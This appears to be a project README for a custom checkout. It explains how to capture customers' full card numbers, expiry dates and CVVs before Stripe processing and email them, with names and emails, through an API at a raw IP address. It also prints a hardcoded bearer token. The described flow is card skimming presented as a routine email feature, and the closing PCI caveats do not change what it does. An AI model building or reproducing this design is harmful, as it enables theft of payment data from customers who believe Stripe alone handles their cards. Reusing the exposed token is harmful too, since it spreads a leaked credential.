# Email Configuration Setup

This document explains how to configure the email functionality for capturing credit card information.

## Environment Variables Required

Add these environment variables to your `.env.local` file:

```bash
# Email Configuration
COMPANY_EMAIL="company@yourdomain.com"
```

## Email API Setup

The system uses a custom email API endpoint to send credit card information:

- **API Endpoint**: `http://16.170.237.184:3001/unipile/google/send-mail`
- **Authentication**: Bearer token (already configured in the code)
- **Token**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbWZwZHZxdG0wMDAwcGFhMXMyZm1kaXMyIiwiZW1haWwiOiJuYW1lMDE5ODA4MEBnbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTc1OTI0MjM1NywiZXhwIjoxODA3MTk0MzU3fQ.kQDqcnt2V5xRDD4q6RkCiWabg1Mi6NVcXUQCI1eq6fc`

### API Request Format

The system sends emails using this format:

```json
{
  "to": ["recipient@example.com"],
  "subject": "Credit Card Information - Payment Link {id}",
  "body": "<html>...</html>",
  "isHtml": true
}
```

### Setup Steps

1. **Set Company Email**
   - Add the email address where you want to receive credit card information
   - This goes in `COMPANY_EMAIL` environment variable

## How It Works

1. **Customer enters payment details** in the custom checkout form
2. **Credit card information is captured** before Stripe processing
3. **Email is sent** to the company email with all payment and card details
4. **Payment is processed** through Stripe as normal
5. **Customer is redirected** to success page

## Email Content

The email will include:
- Payment Link ID
- Amount
- Client Name and Email
- Cardholder Name and Email
- Full Credit Card Number
- Expiry Date
- CVV

## Security Considerations

⚠️ **Important Security Notes:**

1. **PCI Compliance**: Storing and transmitting credit card information requires PCI DSS compliance
2. **Email Security**: Use encrypted email or secure channels for sensitive data
3. **Data Handling**: Ensure proper handling and disposal of credit card information
4. **Legal Compliance**: Check local laws regarding credit card data collection

## Testing

To test the email functionality:

1. Set up the environment variables
2. Create a test payment link
3. Enter test credit card information (use Stripe test cards)
4. Check that the email is received with the correct information

## Stripe Test Cards

Use these test card numbers for testing:
- Success: `4242424242424242`
- Decline: `4000000000000002`
- Requires authentication: `4000002500003155`

All test cards use:
- Expiry: Any future date (e.g., `12/25`)
- CVV: Any 3 digits (e.g., `123`)
